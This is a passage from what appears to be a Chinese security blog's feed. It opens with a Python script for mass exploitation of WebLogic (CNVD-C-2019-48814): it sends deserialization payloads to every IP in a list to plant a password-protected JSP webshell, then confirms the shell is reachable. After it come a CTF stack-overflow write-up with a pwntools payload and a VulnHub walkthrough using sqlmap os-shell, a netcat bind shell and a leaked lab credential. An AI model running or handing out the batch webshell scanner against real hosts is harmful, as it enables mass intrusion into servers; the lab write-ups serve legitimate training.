method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">payload1 = &apos;&apos;&apos;</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;cmd&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4=  &gt; servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#打开文件循环取IP并请求</span><br><span class="line">f = open(sys.argv[1],&apos;r&apos;)</span><br><span class="line">f1=open(&apos;vuln.txt&apos;,&apos;w&apos;)</span><br><span class="line">for ff in f:</span><br><span class="line">    try:</span><br><span class="line">        header=&#123;&apos;content-type&apos;:&apos;text/xml&apos;&#125;</span><br><span class="line">        a = requests.post(&apos;http://&apos;+ff.strip()+path,headers=header,data=payload,timeout=3)#默认全部为http请求</span><br><span class="line">        b = requests.post(&apos;http://&apos;+ff.strip()+path,headers=header,data=payload1,timeout=3)</span><br><span class="line">        r = requests.get(&apos;http://&apos;+ff.strip()+&apos;/_async/webshell.jsp&apos;,headers=header,timeout=3)</span><br><span class="line">        r1 = requests.get(&apos;http://&apos;+ff.strip()+&apos;/bea_wls_internal/webshell.jsp&apos;,headers=header,timeout=3)</span><br><span class="line"></span><br><span class="line">        #r=requests.post(&apos;http://&apos;+ff.strip()+path,headers=header,data=payload,timeout=3)</span><br><span class="line">        if(r.status_code==200):</span><br><span class="line">            print(&apos;[+]&apos;+ff.strip()+&apos;/_async/webshell.jsp&apos;)</span><br><span class="line">            f1.write(ff)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[-]&apos;+ff.strip()+&apos;不存在漏洞&apos;)</span><br><span class="line">        if(r1.status_code==200):</span><br><span class="line">            print(&apos;[+]&apos;+ff.strip()+&apos;/bea_wls_internal/webshell.jsp&apos;)</span><br><span class="line">            f1.write(ff)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[-]&apos;+ff.strip()+&apos;不存在漏洞&apos;)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        print(&apos;[-]&apos;+ff.strip()+&apos;连接超时&apos;)</span><br><span class="line">        continue</span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br><span class="line">print(&apos;漏洞的ip存放在vuln.txt&apos;)</span><br></pre></td></tr></table></figure><p>格式为：python 2019-48814.py 2.txt</p><p>2.txt下格式为：192.168.0.1:7001</p><p>webshell.jsp?pwd=123&amp;cmd=ls</p><p><img src="http://118.126.66.150/images/2019/04/26/924B6093-F8CF-4092-A6B9-C23B681D5D26.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简单写一个通过 cnvd-c-2019-48814 批量getshell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;扫描器可为个人和安全团队作为内部扫描器使用。扫描器切勿用于非法用途！！&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Retaddr</title>
    <link href="https://vuln.top/2019/04/19/Retaddr/"/>
    <id>https://vuln.top/2019/04/19/Retaddr/</id>
    <published>2019-04-19T04:00:37.803Z</published>
    <updated>2019-04-19T12:48:16.687Z</updated>
    
    <content type="html"><![CDATA[<p>###Retaddr</p><p>这是最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址</p><p>通过checksec检查编译的程序，程序为32位 开启NX保护。</p><p><img src="http://118.126.66.150/images/2019/04/18/F83B815C-B7E0-4A92-AE3C-605E6D50AFDE.jpg" alt="image-20190414200433236"></p><p>将程序放入32位的ida F5反编译，</p><p><img src="http://118.126.66.150/images/2019/04/18/B933DFBA-1D00-479B-A5B0-87BD1DEF82B0.jpg" alt="B933DFBA-1D00-479B-A5B0-87BD1DEF82B0"></p><p>点开stkof函数，可以看到字符串距离ebp的长度为0x108</p><p><img src="http://118.126.66.150/images/2019/04/18/A959A146-6E01-4FE4-A8B0-5028F779760E.jpg" alt="A959A146-6E01-4FE4-A8B0-5028F779760E"></p><p>那么栈的结构就为</p><p><img src="http://118.126.66.150/images/2019/04/18/C2F68AF7-CE1D-4D78-A299-3A1AEE7CEA80.jpg" alt="C2F68AF7-CE1D-4D78-A299-3A1AEE7CEA80"></p><p>我们现在只需要找到正确的返回地址就能拿到flag，我们看到ida中有一个getflag的函数</p><p><img src="http://118.126.66.150/images/2019/04/18/D866699F-0DD4-4777-8CD8-D2431CC6A79F.jpg" alt="D866699F-0DD4-4777-8CD8-D2431CC6A79F"></p><p>我们需要找到getflag函数的入口，在ida中按tab 发现getflag的地址为0x0804856B</p><p><img src="http://118.126.66.150/images/2019/04/19/D5522D7C-8337-4562-BF5C-A212C2BD8D8B-2.jpg" alt="image-20190414201858448"></p><p>那么我们的payload就写为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x108*&apos;a&apos;+&apos;bbbb&apos;+0x0804856B</span><br></pre></td></tr></table></figure><p><img src="http://118.126.66.150/images/2019/04/18/B0C22B76-FF5F-44B5-A296-135444AF5A20.jpg" alt="B0C22B76-FF5F-44B5-A296-135444AF5A20"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; target = 0x0804856B</span><br><span class="line">&gt;&gt;&gt; r = remote(&apos;192.168.235.143&apos;,9992)</span><br><span class="line">[x] Opening connection to 192.168.235.143 on port 9992</span><br><span class="line">[x] Opening connection to 192.168.235.143 on port 9992: Trying 192.168.235.143</span><br><span class="line">[+] Opening connection to 192.168.235.143 on port 9992: Done</span><br><span class="line">&gt;&gt;&gt; payload = 0x108*&apos;a&apos;+&apos;bbbb&apos;+p32(target)</span><br><span class="line">&gt;&gt;&gt; r.sendline(payload)</span><br><span class="line">&gt;&gt;&gt; r.recvline()</span><br><span class="line">&apos;Do you know &quot;return address&quot;?\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.recvline()</span><br><span class="line">&apos;You got the right return address!\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.recvline()</span><br><span class="line">&apos;Take your flag and keep going: 123\n&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 target，即，此时的栈结构为</p><p><img src="http://118.126.66.150/images/2019/04/19/80DBDD44-F385-4B2D-BD91-0707261C8082ccabc05eddf0d711.jpg" alt="80DBDD44-F385-4B2D-BD91-0707261C8082"></p><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式需要用pwn模块中的p32转换为机器语言</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###Retaddr&lt;/p&gt;
&lt;p&gt;这是最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址&lt;/p&gt;
&lt;p&gt;通过checksec检查编译的程序，程序为32位 开启NX保护。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://118.126.66.150/images/2
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Casino Royale: 1</title>
    <link href="https://vuln.top/2019/02/27/casino/"/>
    <id>https://vuln.top/2019/02/27/casino/</id>
    <published>2019-02-27T15:31:31.756Z</published>
    <updated>2019-03-05T03:47:32.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Casino-Royale-1"><a href="#Casino-Royale-1" class="headerlink" title="Casino Royale: 1"></a>Casino Royale: 1</h1><h2 id="难度："><a href="#难度：" class="headerlink" title="难度："></a>难度：</h2><p>Intermediate</p><h2 id="关于："><a href="#关于：" class="headerlink" title="关于："></a>关于：</h2><p>Will you gain your status as a 00 agent?</p><p>题目地址：<a href="https://www.vulnhub.com/entry/casino-royale-1,287/#" target="_blank" rel="noopener">https://www.vulnhub.com/entry/casino-royale-1,287/#</a></p><h2 id="Flags"><a href="#Flags" class="headerlink" title="Flags:"></a>Flags:</h2><p>您的目标是获取root和Flag is /root/flag/flag.sh</p><h2 id="Write-Up："><a href="#Write-Up：" class="headerlink" title="Write Up："></a>Write Up：</h2><h3 id="0x01-获取root"><a href="#0x01-获取root" class="headerlink" title="0x01 获取root"></a>0x01 获取root</h3><p>1.通过nmap扫描靶机端口版本，发现存在四个端口：21、25、80、8081<br><code>nmap -sV x.x.x.x</code><br><img src="http://118.126.66.150/images/2019/03/05/1.jpg" alt="image.jpg"></p><p>2.我们从80端口入手，首先查看网页的源代码并无发现线索，其次对80端口进行目录爆破找到一个phpmyadmin的登陆页面和一个install<br><code>dirb [url]</code><br><img src="http://118.126.66.150/images/2019/03/05/2.jpg" alt="image.jpg"></p><p>3.我们开打install页面出现这样一个界面，点击cliek to start install 后页面报错<br><img src="http://118.126.66.150/images/2019/03/05/3.jpg" alt="image.jpg"></p><p>4.存在install页面说明网站肯定存在这个cms，我们查找相关cms版本信息并获取到源代码且存在一个exp漏洞<br><img src="http://118.126.66.150/images/2019/03/05/4.jpg" alt="image.jpg"></p><p>5.翻开源代码后台路径是<code>pokeradmin</code>，并且发现登陆处并且未做sql注入防护<br><img src="http://118.126.66.150/images/2019/03/05/5.jpg" alt="image.jpg"></p><p>6.直接使用sqlmap跑取账户密码后getshell<br><code>sqlmap.py -u &#39;http://192.168.235.140:80/pokeradmin/&#39; --data=&#39;op=adminlogin&amp;username=admin&amp;password=admin&#39; --level=5 --risk=3 --os-shell</code><br><img src="http://118.126.66.150/images/2019/03/05/6.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/7.jpg" alt="image.jpg"></p><p>7.将kali开一个apache把一句话放在/var/www/html中，然后在靶机的shell中运行wget<br><img src="http://118.126.66.150/images/2019/03/05/8.jpg" alt="image.jpg"></p><p>8.打开中国蚁剑或中国菜刀（效果是一样的）配置如下<br><img src="http://118.126.66.150/images/2019/03/05/9.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/10.jpg" alt="image.jpg"></p><p>9.getshell后我们先将数据库的账户密码保存下来<br><code>valenka:11archives11!</code></p><p><img src="http://118.126.66.150/images/2019/03/05/11.jpg" alt="image.jpg"></p><p>10.在一段查看后没有发现有价值的信息，查看8081端口，主页面有一个Run Data Collect的按钮，点击后访问到collect.php</p><p><img src="http://118.126.66.150/images/2019/03/05/12.jpg" alt="image.jpg"></p><p>11.因为我们已经拿到www-data的权限了所以我们可以通过find来查找collect.php，找到8081端口的主目录在/opt/casino-royale/<br><code>find / -name [name]</code><br><img src="http://118.126.66.150/images/2019/03/05/13.jpg" alt="image.jpg"></p><p>12.进入8081端口主目录后查看文件权限<br><img src="http://118.126.66.150/images/2019/03/05/14.jpg" alt="image.jpg"></p><p>13.查看权限后发现只有<code>casino-data-collection.py</code>这个文件我可以修改，cat查看文件内容，python文件打开了<code>user-data.log</code>继续查看里面内容与collect.php内容一样<br><img src="http://118.126.66.150/images/2019/03/05/15.jpg" alt="image.jpg"></p><p>14.继续查看<code>collect.php</code>，基本了解程序大概的过程和出题人的思路，<code>collect.php</code>为root权限只可读所以不能更改但是执行的<code>casino-data-collection.py</code>为www-data组所以可以修改，而<code>casino-data-collection.py</code>打开了<code>user-data.log</code>所以php读到了log的内容，所以我们只要修改python文件即可获取到le的权限<br>解题思路：在python文件中通过os模块执行系统命令返回nc拿到le权限<br><img src="http://118.126.66.150/images/2019/03/05/16.jpg" alt="image.jpg"></p><p><img src="http://118.126.66.150/images/2019/03/05/17.jpg" alt="image.jpg"></p><p>15.修改python后，再在浏览器重新打开页面靶机会开启一个带bash的1111端口，使用攻击机的nc连接,获取到le的权限<br><img src="http://118.126.66.150/images/2019/03/05/18.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/19.jpg" alt="image.jpg"></p><p>16.但是这是一个半交互式的页面无法切换账户，通过查阅资料可以通过python调用本地shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot; &gt; /tmp/asdf.py</span><br><span class="line"></span><br><span class="line">python /tmp/asdf.py</span><br></pre></td></tr></table></figure></p><p><img src="http://118.126.66.150/images/2019/03/05/20.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/21.jpg" alt="image.jpg"></p><p>17.在获取到le的交互式shell后尝试第九步中valenka的账户密码登录。成功登陆但是先切回le，exit退出<br><code>valenka:11archives11!</code><br><img src="http://118.126.66.150/images/2019/03/05/22.jpg" alt="image.jpg"></p><p>18.查看run.sh，并尝试运行<code>mi6_detect_test</code>这个程序，发现与run.sh中的内容相同，我猜测<code>mi6_detect_test</code>就是将run.sh运行<br><img src="http://118.126.66.150/images/2019/03/05/23.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/24.jpg" alt="image.jpg"></p><p>18.<code>mi6_detect_test</code>为root所以我们通过echo命令把后门写入run.sh在运行mi6既可获取到root权限<br><code>echo &quot;nc -lvvp 1234 -t -e /bin/bash&quot; &gt;&gt; run.sh</code><br><img src="http://118.126.66.150/images/2019/03/05/25.jpg" alt="image.jpg"></p><p><img src="http://118.126.66.150/images/2019/03/05/26.jpg" alt="image.jpg"></p><p>19.成功监听端口，攻击机nc连接靶机，并getflag<br><img src="http://118.126.66.150/images/2019/03/05/27.jpg" alt="image.jpg"></p><p>难点总结：<br>1.python半交互式切换到全交互式<br>2.mi6_detect_test和run.sh程序的关联<br>3.理清这几个程序之间的关系<br>4.无法通过内核漏洞提权</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Casino-Royale-1&quot;&gt;&lt;a href=&quot;#Casino-Royale-1&quot; class=&quot;headerlink&quot; title=&quot;Casino Royale: 1&quot;&gt;&lt;/a&gt;Casino Royale: 1&lt;/h1&gt;&lt;h2 id=&quot;难度：&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>总结2018</title>
    <link href="https://vuln.top/2019/02/24/%E6%80%BB%E7%BB%932018%E5%B9%B4/"/>
    <id>https://vuln.top/2019/02/24/总结2018年/</id>
    <published>2019-02-24T13:18:02.000Z</published>
    <updated>2019-02-23T19:30:11.491Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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